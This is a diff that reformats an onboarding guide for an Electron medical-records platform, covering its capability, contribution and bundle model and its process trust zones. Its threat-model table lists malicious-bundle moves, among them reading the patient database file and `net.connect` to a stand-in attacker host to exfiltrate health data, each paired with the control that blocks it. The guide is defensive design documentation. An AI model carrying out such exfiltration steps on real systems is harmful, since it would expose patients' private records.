@@ -42,7 +42,7 @@ Imagine you are writing this app with no platform — just an Electron starter. 
 
 ```ts
 // Renderer code
-window.electronAPI.savePatientNote(patientId, text)
+window.electronAPI.savePatientNote(patientId, text);
 ```
 
 The preload script exposes `savePatientNote`. The main process implements it. SQLite gets written. Everything works.
@@ -50,7 +50,7 @@ The preload script exposes `savePatientNote`. The main process implements it. SQ
 A week later, you need to fetch notes:
 
 ```ts
-window.electronAPI.fetchPatientNotes(patientId)
+window.electronAPI.fetchPatientNotes(patientId);
 ```
 
 Another preload method. Another main handler. Another month, another fifteen methods. The preload is now 400 lines. Every new feature edits the preload. The preload is the entire trust surface of the app.
@@ -67,11 +67,11 @@ Three failure modes have appeared, and they compound:
 
 The three concepts in this guide each solve one of these:
 
-| Failure mode | Concept that solves it |
-|---|---|
-| Preload grows unbounded | **Capability** — one preload method (`bindCapability`), capabilities multiply behind it |
-| Location leaks into call sites | **Capability** — typed proxy hides whether work happens in Main, Host, or Cloud |
-| Shell hardcodes features | **Contribution** + **Bundle** — shell iterates contribution slots; bundles fill them |
+| Failure mode                   | Concept that solves it                                                                  |
+| ------------------------------ | --------------------------------------------------------------------------------------- |
+| Preload grows unbounded        | **Capability** — one preload method (`bindCapability`), capabilities multiply behind it |
+| Location leaks into call sites | **Capability** — typed proxy hides whether work happens in Main, Host, or Cloud         |
+| Shell hardcodes features       | **Contribution** + **Bundle** — shell iterates contribution slots; bundles fill them    |
 
 Hold that table in your head while you read. Every detail below is in service of one of those three.
 
@@ -98,8 +98,8 @@ A capability shows up in two places. **In the consumer**, as a typed proxy:
 
 ```ts
 // Renderer code (illustrative — exact API shape evolves through Phase 6+)
-const notes = await window.soam.bindCapability('local.notes', '1.0')
-const note = await notes.call('open', patientId)
+const notes = await window.soam.bindCapability('local.notes', '1.0');
+const note = await notes.call('open', patientId);
 ```
 
 **In the implementer**, as a handler registered against a name:
@@ -108,11 +108,11 @@ const note = await notes.call('open', patientId)
 // Main code — this exists today in electron/main/capability/platform-ping.ts
 registerCapability('platform.ping', '1.0', async (method, args) => {
   if (method !== 'ping') {
-    throw new Error(`Unknown method: ${method}`)
+    throw new Error(`Unknown method: ${method}`);
   }
-  const message = typeof args[0] === 'string' ? args[0] : ''
-  return { echo: message, pid: process.pid, ts: Date.now() }
-})
+  const message = typeof args[0] === 'string' ? args[0] : '';
+  return { echo: message, pid: process.pid, ts: Date.now() };
+});
 ```
 
 These two sides do not import each other. They only agree on the **name + version + method shape**. The capability registry is the matchmaker.
@@ -143,15 +143,15 @@ Real cases this will hit:
 - Audit log starts as a local SQLite table. It becomes a streaming append to a cloud audit service. **Capabilities: zero callers change.** Direct imports: rewrite every audit emission site.
 - A capability gets a new method. Old consumers don't break; the typed contract simply grew.
 
-### What capability is *not*
+### What capability is _not_
 
-| It is | It is not |
-|---|---|
-| A typed async contract | A REST endpoint URL |
-| Identified by name + version | Identified by file path or class |
-| Resolved through the registry | Resolved by import |
-| Always async | Sometimes sync |
-| Mostly Main-resident for PHI | Renderer-resident |
+| It is                         | It is not                        |
+| ----------------------------- | -------------------------------- |
+| A typed async contract        | A REST endpoint URL              |
+| Identified by name + version  | Identified by file path or class |
+| Resolved through the registry | Resolved by import               |
+| Always async                  | Sometimes sync                   |
+| Mostly Main-resident for PHI  | Renderer-resident                |
 
 > **Self-check:** If you find yourself writing `import { savePatient } from '@platform/main/patients'` in Renderer code, the capability model has not been followed. Step back and ask: what's the capability name? Who owns it?
 
@@ -161,7 +161,7 @@ Real cases this will hit:
 
 ### The intuition
 
-A capability lets a bundle **consume** something from the platform. A contribution lets a bundle **publish** something *to* the platform.
+A capability lets a bundle **consume** something from the platform. A contribution lets a bundle **publish** something _to_ the platform.
 
 They are duals. You almost always need both.
 
@@ -173,14 +173,14 @@ A **contribution point** is a typed slot the platform owns. Bundles register aga
 
 Illustrative slots (the actual catalogue is platform-team-owned and grows over time — see Open Item O7):
 
-| Contribution point | Bundle registers | Platform consumes for |
-|---|---|---|
-| `commands` | `{ id, title, handler }` | Command palette, keybindings, menus |
-| `views` | `{ id, location, component }` | Mounting iframes in sidebar / panel / editor |
-| `settings` | `{ key, type, default, description }` | Settings editor, configuration store |
-| `validators` | `{ schema, scope }` | Renderer live-validation **and** authority enforcement (same rule, two sites) |
-| `menus` | `{ menu, group, when }` | Building the actual menu structures |
-| `keybindings` | `{ key, command, when }` | Keyboard dispatcher |
+| Contribution point | Bundle registers                      | Platform consumes for                                                         |
+| ------------------ | ------------------------------------- | ----------------------------------------------------------------------------- |
+| `commands`         | `{ id, title, handler }`              | Command palette, keybindings, menus                                           |
+| `views`            | `{ id, location, component }`         | Mounting iframes in sidebar / panel / editor                                  |
+| `settings`         | `{ key, type, default, description }` | Settings editor, configuration store                                          |
+| `validators`       | `{ schema, scope }`                   | Renderer live-validation **and** authority enforcement (same rule, two sites) |
+| `menus`            | `{ menu, group, when }`               | Building the actual menu structures                                           |
+| `keybindings`      | `{ key, command, when }`              | Keyboard dispatcher                                                           |
 
 ### What a contribution looks like
 
@@ -192,10 +192,10 @@ ctx.contributions.commands.register({
   id: 'patients.openRecord',
   title: 'Open Patient Record',
   handler: async (patientId: string) => {
-    const notes = await ctx.capabilities.bind('local.notes', '1.0')
-    return notes.call('open', patientId)
+    const notes = await ctx.capabilities.bind('local.notes', '1.0');
+    return notes.call('open', patientId);
   },
-})
+});
 
 ctx.contributions.views.register({
   id: 'patients.sidebar',
@@ -203,7 +203,7 @@ ctx.contributions.views.register({
   // For bundle views this is not a React component — it's an entry to a sandboxed iframe
   // hosted via `view://` protocol per ADR-411. Phase 7+.
   view: 'view://patients/sidebar.html',
-})
+});
 ```
 
 The shell knows nothing about `patients`. It iterates `contributions.commands` and shows them all in the palette. It iterates `contributions.views` and mounts each in the location requested. Adding a new bundle means adding new entries to those iterations. **The shell does not change.**
@@ -215,7 +215,7 @@ You could imagine merging the two: every bundle just registers "things" with the
 The reason this is a bad idea: **they have different lifecycles, different ownership, and different trust implications.**
 
 - A **capability** the bundle consumes is owned by someone else. Bind it, use it, release it. If it disappears, you handle the error.
-- A **contribution** the bundle publishes is owned by the bundle itself. Register it, the platform indexes it, dispose to remove it. If the *bundle* disappears, the platform cleans up.
+- A **contribution** the bundle publishes is owned by the bundle itself. Register it, the platform indexes it, dispose to remove it. If the _bundle_ disappears, the platform cleans up.
 
 Fusing them obscures the direction of trust. ADR-104 calls this out explicitly in "Considered Options" — it was on the table and was rejected.
 
@@ -239,8 +239,9 @@ If a capability is a menu item and a contribution is an entry on the menu board,
 ### The three sides of a bundle
 
 ```
+
 Bundle
-├── Capabilities consumed   ── What I take from the platform
+├── Capabilities consumed ── What I take from the platform
 ├── Capabilities implemented ── What I provide (often: my own domain logic)
 ├── Contributions published  ── What I add to the shell's surfaces
 └── Lifecycle                ── When I activate; what I dispose on teardown
@@ -256,23 +257,25 @@ A bundle is a Node module that exports one function:
 // Illustrative — Phase 6+
 export async function activate(ctx: BundleContext): Promise<Disposable> {
   // 1. Consume the capabilities I need
-  const notes = await ctx.capabilities.bind('local.notes', '1.0')
-  const audit = await ctx.capabilities.bind('audit.log', '1.0')
+  const notes = await ctx.capabilities.bind('local.notes', '1.0');
+  const audit = await ctx.capabilities.bind('audit.log', '1.0');
 
   // 2. Implement my own capabilities (optional)
   const patientsCap = ctx.capabilities.implement('patients.lookup', '1.0', {
-    findByName: async (name) => { /* runs in Bundle Host */ },
-  })
+    findByName: async (name) => {
+      /* runs in Bundle Host */
+    },
+  });
 
   // 3. Publish contributions
   const cmd = ctx.contributions.commands.register({
     id: 'patients.openRecord',
     title: 'Open Patient Record',
     handler: async (id) => notes.call('open', id),
-  })
+  });
 
   // 4. Return one disposable that tears all of this down
-  return Disposable.from(notes, audit, patientsCap, cmd)
+  return Disposable.from(notes, audit, patientsCap, cmd);
 }
 ```
 
@@ -326,57 +329,55 @@ This is identical to VSCode's "extension runs in Extension Host; webviews are sa
 This is the diagram to memorise:
 
 ```
-┌────────────────────────────────────────────────────────────────────┐
-│                                                                    │
-│   RENDERER (Chromium, sandboxed)                                   │
-│   ┌──────────────────────────┐  ┌──────────────────────────────┐   │
-│   │  Workbench shell (React) │  │  Bundle view iframe(s)       │   │
-│   │  - reads contributions   │  │  (one per mounted view)      │   │
-│   │  - mounts iframes        │  │  - sandboxed, narrow bridge  │   │
-│   │  - calls capabilities    │  │  - calls capabilities        │   │
-│   └────────────┬─────────────┘  └────────────┬─────────────────┘   │
-│                │                              │                    │
-│                └───────────┬──────────────────┘                    │
-│                            │ window.soam.bindCapability(...)       │
-└────────────────────────────┼───────────────────────────────────────┘
-                             │ IPC (one channel: soam:call)
-                             ▼
-┌────────────────────────────────────────────────────────────────────┐
-│  MAIN (Node, trusted)                                              │
-│                                                                    │
-│  ┌──────────────────────────────────────────────────────────────┐  │
-│  │  Capability registry                                         │  │
-│  │  - 'local.notes@1.0'      → Main handler (PHI; DB here)      │  │
-│  │  - 'audit.log@1.0'        → Main handler                     │  │
-│  │  - 'patients.lookup@1.0'  → forwards to Bundle Host          │  │
-│  └─────────────────┬─────────────────────────────┬──────────────┘  │
-│                    │                             │                 │
-│  ┌─────────────────▼──────────────┐              │                 │
-│  │  Main-resident services        │              │                 │
-│  │  - SQLite (Local Store)        │              │                 │
-│  │  - KEK / crypto                │              │                 │
-│  │  - Audit log                   │              │                 │
-│  │  - Brokered networking         │              │                 │
-│  └────────────────────────────────┘              │                 │
-│                                                  │                 │
-│  ┌───────────────────────────────────────────────┘                 │
-│  │  Contribution registry (sent to Renderer at boot)               │
-│  │  - commands: [...]   views: [...]   settings: [...]   ...       │
-│  └─────────────────────────────────────────────────────────────────┘
-└────────────────────────────┬───────────────────────────────────────┘
-                             │ parentPort messages
-                             ▼
-┌────────────────────────────────────────────────────────────────────┐
-│  BUNDLE HOST (Node utilityProcess, trusted; hardened from Phase 6) │
-│                                                                    │
-│  ┌──────────────────────────────────────────────────────────────┐  │
-│  │  Bundle code                                                 │  │
-│  │  - activate() runs here                                      │  │
-│  │  - capability implementations bundles own                    │  │
-│  │  - business logic                                            │  │
-│  │  - NO direct fs/net/child_process (Phase 6 hardening)        │  │
-│  └──────────────────────────────────────────────────────────────┘  │
-└────────────────────────────────────────────────────────────────────┘
+┌────────────────────────────────────────────────────────────────────────┐
+│                                                                        │
+│   RENDERER (Chromium, sandboxed)                                       │
+│   ┌──────────────────────────┐      ┌──────────────────────────────┐   │
+│   │  Workbench shell (React) │      │  Bundle view iframe(s)       │   │
+│   │  - reads contributions   │      │  (one per mounted view)      │   │
+│   │  - mounts iframes        │      │  - sandboxed, narrow bridge  │   │
+│   │  - calls capabilities    │      │    (via view://)             │   │
+|   |                          |      │  - calls capabilities        │   │
+│   └────────────┬─────────────┘      └─────────────┬────────────────┘   │
+│                │                                  │                    │
+│                │ window.soam.bindCapability(...)  │                    │
+└────────────────┼──────────────────────────────────┼────────────────────┘
+                 │                                  |
+                 │  IPC (one channel: soam:call)    |
+                 │                                  |
+┌────────────────▼──────────────────────────────────▼────────────────────┐
+│  MAIN (Node, trusted zone, matchmaker)                                 │
+│                                                                        │
+│  ┌────────────────────────────────────────────────────────────────┐    │
+│  │                   CAPABILITY REGISTRY                          │    │
+│  │  - 'local.notes@1.0'      → Main handler (PHI; DB here)        │    │
+│  │  - 'audit.log@1.0'        → Main handler                       │    │
+│  │  - 'patients.lookup@1.0'  → forwards to Bundle Host            │    │
+│  └─────────────────┬─────────────────────────────┬────────────────┘    │
+│                    │                             │                     │
+│  ┌─────────────────▼──────────────┐  ┌───────────▼────────────────┐    │
+│  │  Main-resident services        │  │  Contribution registry     │    │
+│  │  - SQLite (Local Store)        │  │ (sent to Renderer at boot) │    │
+│  │  - KEK / crypto                │  │  - commands: [...]         │    │
+│  │  - Audit log                   │  │  - views: [...]            │    │
+│  │  - Brokered networking         │  │  - settings: [...]         │    │
+│  └────────────────────────────────┘  └────────────────────────────┘    │
+│                                                                        │
+└──────────────────────────────────────────────────┬─────────────────────┘
+                                                   |
+                                                   │ parentPort (IPC)
+                                                   |
+┌──────────────────────────────────────────────────▼─────────────────────┐
+│  BUNDLE   HOST (Node utilityProcess, trusted; hardened from Phase 6)   │
+│                                                                        │
+│  ┌──────────────────────────────────────────────────────────────┐      │
+│  │  Bundle code                                                 │      │
+│  │  - activate() runs here                                      │      │
+│  │  - capability implementations bundles own                    │      │
+│  │  - business logic                                            │      │
+│  │  - NO direct fs/net/child_process (Phase 6 hardening)        │      │
+│  └──────────────────────────────────────────────────────────────┘      │
+└────────────────────────────────────────────────────────────────────────┘
 ```
 
 ### Reading the diagram
@@ -389,12 +390,12 @@ This is the diagram to memorise:
 
 ### The four communication paths
 
-| From | To | Through | Example |
-|---|---|---|---|
-| Renderer | Main | `window.soam.bindCapability` → IPC | Renderer calls `local.notes.open(id)` |
-| Renderer | Bundle Host | Main brokers | Same call, if the capability is Host-implemented |
-| Bundle Host | Main | parentPort message → registry | Bundle calls `audit.log.emit(...)` |
-| Bundle Host | Renderer (view) | Via the `view://` bridge | Bundle pushes data to its own iframe |
+| From        | To              | Through                            | Example                                          |
+| ----------- | --------------- | ---------------------------------- | ------------------------------------------------ |
+| Renderer    | Main            | `window.soam.bindCapability` → IPC | Renderer calls `local.notes.open(id)`            |
+| Renderer    | Bundle Host     | Main brokers                       | Same call, if the capability is Host-implemented |
+| Bundle Host | Main            | parentPort message → registry      | Bundle calls `audit.log.emit(...)`               |
+| Bundle Host | Renderer (view) | Via the `view://` bridge           | Bundle pushes data to its own iframe             |
 
 No other communication exists. No direct Renderer → Host. No Renderer → DB. No Host → SQLite file. Each is impossible by construction, not by convention.
 
@@ -404,15 +405,15 @@ No other communication exists. No direct Renderer → Host. No Renderer → DB. 
 
 If you know VSCode extensions, the mapping is nearly one-to-one:
 
-| VSCode | This platform | Notes |
-|---|---|---|
-| Extension | Bundle | Same role, same lifecycle |
-| Extension Host (Node) | Bundle Host (`utilityProcess`) | Same process model |
-| `vscode.*` API | `ctx.capabilities.bind(...)` | Typed contract per capability vs. one monolithic API |
-| `contributes.commands` in `package.json` | Contributions registry | Same idea, mechanism deferred (O5) |
-| Webview | Sandboxed iframe + `view://` protocol | Stricter sandbox here |
-| Activation events (`onCommand`, `onLanguage`) | Bundle triggers (`eager`/`lazy`/`onEvent`) | Same shape |
-| `activate()` returns subscriptions | `activate()` returns `Disposable` | Same idea, one verb |
+| VSCode                                        | This platform                              | Notes                                                |
+| --------------------------------------------- | ------------------------------------------ | ---------------------------------------------------- |
+| Extension                                     | Bundle                                     | Same role, same lifecycle                            |
+| Extension Host (Node)                         | Bundle Host (`utilityProcess`)             | Same process model                                   |
+| `vscode.*` API                                | `ctx.capabilities.bind(...)`               | Typed contract per capability vs. one monolithic API |
+| `contributes.commands` in `package.json`      | Contributions registry                     | Same idea, mechanism deferred (O5)                   |
+| Webview                                       | Sandboxed iframe + `view://` protocol      | Stricter sandbox here                                |
+| Activation events (`onCommand`, `onLanguage`) | Bundle triggers (`eager`/`lazy`/`onEvent`) | Same shape                                           |
+| `activate()` returns subscriptions            | `activate()` returns `Disposable`          | Same idea, one verb                                  |
 
 So at a high level: **bundles are VSCode extensions.** That's the right mental shortcut.
 
@@ -487,7 +488,7 @@ Wait. How does the Renderer "invoke" a function that lives in Host? It doesn't d
 **3. Bundle Host: command handler executes.**
 
 ```ts
-async (id) => notes.call('open', id)
+async (id) => notes.call('open', id);
 ```
 
 `notes` is a capability proxy bound during `activate()`. `.call('open', id)` is an outbound capability call from Host back through Main.
@@ -499,11 +500,11 @@ This capability is **Main-implemented**, not Host-implemented. The handler is a 
 ```ts
 // In Main
 async (method, args) => {
-  if (workspaceLocked()) throw new Error('KEK locked')
-  await audit.log({ event: 'phi.read', capability: 'local.notes', method: 'open' })
-  const ciphertext = await db.query('SELECT body FROM notes WHERE patient_id = ?', args)
-  return decrypt(ciphertext, kek)
-}
+  if (workspaceLocked()) throw new Error('KEK locked');
+  await audit.log({ event: 'phi.read', capability: 'local.notes', method: 'open' });
+  const ciphertext = await db.query('SELECT body FROM notes WHERE patient_id = ?', args);
+  return decrypt(ciphertext, kek);
+};
 ```
 
 The KEK check, the audit emission, the DB query, the decryption — all in Main. Bundle Host never touches the DB. Bundle Host never sees the KEK.
@@ -517,7 +518,7 @@ Structured-clone serialisation over `parentPort`. Host's `notes.call('open', id)
 The bundle has a view iframe mounted in the editor area. It sends the note over the view bridge:
 
 ```ts
-view.postMessage({ type: 'note-loaded', note })
+view.postMessage({ type: 'note-loaded', note });
 ```
 
 **7. Renderer iframe: receives the note, renders it.**
@@ -554,14 +555,14 @@ This is the most important thing the capability boundary does. Everything else i
 
 You are writing a bundle. Suppose you turn malicious — or, more likely, suppose a dependency you didn't audit turns malicious. What can the bundle do?
 
-| Attack | If we used VSCode-style extensions | Here |
-|---|---|---|
-| `fs.readFileSync('/path/to/patient-db.sqlite')` | Possible. PHI exfiltrated. | `fs` blocked in Bundle Host. Impossible. |
-| `net.connect('evil.example.com')` | Possible. PHI exfiltrated. | `net` blocked. All outbound traffic through a `net.brokered.fetch` capability Main controls. |
-| Encode PHI as DNS lookups | Possible (creative `fs` -> `os` -> resolver chain). | DNS path closed; no system APIs reachable from Host. |
-| Read PHI while workspace is locked | N/A — no concept of locked workspace. | Capability handler refuses (`workspaceLocked()` returns true). Bundle has no fallback path to data. |
-| Skip the audit log | Possible — extension can choose. | Audit emission is **in the capability handler**, not in the caller. Cannot be skipped. |
-| Stash decrypted PHI in IndexedDB and exfiltrate later | Possible in Renderer code. | Renderer never owns persistence; only Main does. Renderer can see PHI to render it, cannot persist it. |
+| Attack                                                | If we used VSCode-style extensions                  | Here                                                                                                   |
+| ----------------------------------------------------- | --------------------------------------------------- | ------------------------------------------------------------------------------------------------------ |
+| `fs.readFileSync('/path/to/patient-db.sqlite')`       | Possible. PHI exfiltrated.                          | `fs` blocked in Bundle Host. Impossible.                                                               |
+| `net.connect('evil.example.com')`                     | Possible. PHI exfiltrated.                          | `net` blocked. All outbound traffic through a `net.brokered.fetch` capability Main controls.           |
+| Encode PHI as DNS lookups                             | Possible (creative `fs` -> `os` -> resolver chain). | DNS path closed; no system APIs reachable from Host.                                                   |
+| Read PHI while workspace is locked                    | N/A — no concept of locked workspace.               | Capability handler refuses (`workspaceLocked()` returns true). Bundle has no fallback path to data.    |
+| Skip the audit log                                    | Possible — extension can choose.                    | Audit emission is **in the capability handler**, not in the caller. Cannot be skipped.                 |
+| Stash decrypted PHI in IndexedDB and exfiltrate later | Possible in Renderer code.                          | Renderer never owns persistence; only Main does. Renderer can see PHI to render it, cannot persist it. |
 
 ### How the architecture enforces each of these
 
@@ -575,11 +576,11 @@ You are writing a bundle. Suppose you turn malicious — or, more likely, suppos
 
 **5. Renderer is the least trusted zone.** It can hold PHI in transient state to render it on screen. It cannot persist it. The IndexedDB / localStorage paths are not exposed through capabilities; only Main owns persistent storage. This is enforced by ADR-302 (Local Store in Main) and the trust hierarchy.
 
-### One thing the architecture does *not* enforce yet
+### One thing the architecture does _not_ enforce yet
 
 **Crash dumps may contain PHI in memory.** ADR-303 Open Item O28: a Node process crash dump can contain anything that was in memory, including decrypted PHI. Scrubbing crash dumps before they leave the device is required and not yet implemented.
 
-This is called out so you don't read "PHI never leaks" and assume the work is done. It's structurally enforced for the *normal* paths. Crash-time scrubbing is its own piece of work.
+This is called out so you don't read "PHI never leaks" and assume the work is done. It's structurally enforced for the _normal_ paths. Crash-time scrubbing is its own piece of work.
 
 ### Why this is the difference that matters
 
@@ -597,7 +598,7 @@ These are the dead-ends people actually hit. Each is followed by the correction 
 
 ### "A bundle is a service."
 
-No. A **service** (ADR-103 terminology) is an implementation of one or more capabilities. A **bundle** (ADR-104 terminology) is a registration unit that may *contain* services, but also consumes capabilities, publishes contributions, has a lifecycle, may have a UI.
+No. A **service** (ADR-103 terminology) is an implementation of one or more capabilities. A **bundle** (ADR-104 terminology) is a registration unit that may _contain_ services, but also consumes capabilities, publishes contributions, has a lifecycle, may have a UI.
 
 > A service implements one contract. A bundle is a project.
 
@@ -690,14 +691,14 @@ Try these before reading the answers. The point is not to be right, but to notic
 
 **8.** The trace:
 
-   - Renderer calls `patients.lookup.findByName('Smith')` via `window.soam.bindCapability` → IPC → Main.
-   - Main's registry sees `patients.lookup@1.0` is **Host-implemented**. Main forwards the call to Bundle Host via `parentPort`.
-   - Bundle Host runs the handler. The handler needs three notes, so it calls `local.notes.open(id)` three times via its capability proxy.
-   - Each call goes from Host → Main via `parentPort`. Main sees `local.notes@1.0` is **Main-implemented**. The handler runs in Main — KEK check, DB query, decrypt, audit emit, return.
-   - Each note flows back Host. The Host handler composes the result and returns.
-   - Main forwards the final result to the Renderer.
+- Renderer calls `patients.lookup.findByName('Smith')` via `window.soam.bindCapability` → IPC → Main.
+- Main's registry sees `patients.lookup@1.0` is **Host-implemented**. Main forwards the call to Bundle Host via `parentPort`.
+- Bundle Host runs the handler. The handler needs three notes, so it calls `local.notes.open(id)` three times via its capability proxy.
+- Each call goes from Host → Main via `parentPort`. Main sees `local.notes@1.0` is **Main-implemented**. The handler runs in Main — KEK check, DB query, decrypt, audit emit, return.
+- Each note flows back Host. The Host handler composes the result and returns.
+- Main forwards the final result to the Renderer.
 
-   Five process hops total. The Renderer made one capability call; the architecture handled the rest.
+Five process hops total. The Renderer made one capability call; the architecture handled the rest.
 
 ---
 
